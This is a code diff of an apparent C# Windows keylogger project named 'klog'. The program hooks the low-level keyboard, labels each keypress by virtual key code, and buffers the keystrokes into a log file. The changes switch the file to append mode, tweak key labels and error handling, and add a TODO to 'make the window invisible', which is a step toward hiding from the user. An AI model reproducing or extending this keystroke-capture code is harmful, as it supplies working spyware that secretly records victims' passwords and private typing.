@@ -4,9 +4,11 @@ using Windows.Win32.UI.WindowsAndMessaging;
 
 namespace klog;
 
+// TODO make the window invisible
 #pragma warning disable CA1416
 public static class Program
 {
+    // TODO change buffer size
     private const uint BufferSize = 10;
     private const int KEYDOWN = 0x0100;
     private const int KEYUP = 0x0101;
@@ -17,7 +19,7 @@ public static class Program
 
     private static readonly List<string> Buffer = new();
     private static UnhookWindowsHookExSafeHandle? _kbHook;
-    private static StreamWriter _writer = new(PathToFile);
+    private static StreamWriter _writer = new(PathToFile, true);
     private static bool _capsLockActive;
     private static bool _shiftActive;
 
@@ -81,7 +83,7 @@ public static class Program
             0x11 => "\n[CTRL] ",
             0x12 => "\n[ALT] ",
             0x13 => "\n[PAUSE] ",
-            0x14 when _capsLockActive => "[CAPS LOCK OFF] ",
+            0x14 when _capsLockActive => " [CAPS LOCK OFF] ",
             0x14 when !_capsLockActive => "\n[CAPS LOCK ON] ",
             0x15 => "\n[IME Kana/Hangul mode] ",
             0x17 => "\n[IME On] ",
@@ -93,7 +95,7 @@ public static class Program
             0x1D => "\n[IME nonconvert] ",
             0x1E => "\n[IME accept] ",
             0x1F => "\n[IME mode change request] ",
-            0x20 => "\n[SPACE] ",
+            0x20 => " [SPACE] ",
             0x21 => "\n[PAGE UP] ",
             0x22 => "\n[PAGE DOWN] ",
             0x23 => "\n[END] ",
@@ -241,6 +243,7 @@ public static class Program
             0xB5 => "\n[SELECT MEDIA] ",
             0xB6 => "\n[START APPLICATION 1] ",
             0xB7 => "\n[START APPLICATION 2] ",
+            // TODO add misc characters, missing all the :;'" things
             _ => $"[CODE {kbStruct->vkCode.ToString()}]"
         };
 
@@ -274,6 +277,7 @@ public static class Program
     ///     <see cref="BufferSize" /> has been reached.
     /// </summary>
     /// <param name="stringToWrite">String to add to buffer</param>
+    // needs to be an async void because can't make KeyboardCallback async, so cannot await inside of it
     private static async void WriteToFile(string stringToWrite)
     {
         if (Buffer.Count >= BufferSize)
@@ -282,19 +286,22 @@ public static class Program
                 await WriteBuffer();
                 await _writer.FlushAsync();
             }
-            catch (ObjectDisposedException)
+            catch (ObjectDisposedException e)
             {
-                _writer = new StreamWriter(PathToFile);
+                // if the StreamWriter was somehow disposed, create a new one
+                _writer = new StreamWriter(PathToFile, true);
                 await WriteBuffer();
                 await _writer.FlushAsync();
+                Console.WriteLine(e.Message);
             }
-            catch (InvalidOperationException)
+            catch (InvalidOperationException e)
             {
                 // InvalidOperationException can be thrown when the StreamWriter is currently in use, so 
                 // the code waits for 1 second before writing the buffer and copies the buffer before that so there's
                 // no new buffer that would be written twice to the file while the old one would be lost
                 var tempBuffer = Buffer;
                 await Task.Delay(1000).ContinueWith(_ => WriteBuffer(tempBuffer));
+                Console.WriteLine(e.Message);
             }
 
         Buffer.Add(stringToWrite);
